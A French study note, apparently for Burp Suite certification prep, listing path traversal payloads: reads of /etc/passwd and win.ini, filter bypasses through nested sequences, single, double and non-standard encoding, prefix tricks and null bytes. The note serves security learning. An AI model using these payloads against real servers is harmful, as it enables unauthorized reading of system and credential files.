---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- Traversal simple (Unix) : `../../../etc/passwd`
- Traversal simple (Windows) : `..\..\..\windows\win.ini`
- Séquences imbriquées (contournement d'un retrait non récursif de `../`) : `....//` ou `....\/`
- Encodage simple : `%2e%2e%2f`
- Double encodage : `%252e%252e%252f`
- Encodage non standard : `%c0%af` ou `..%ef%bc%8f`
- Contournement validation de préfixe (chemin absolu) : `filename=/var/www/images/../../../etc/passwd`
- Contournement validation d'extension (null byte) : `filename=../../../etc/passwd%00.png`
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**
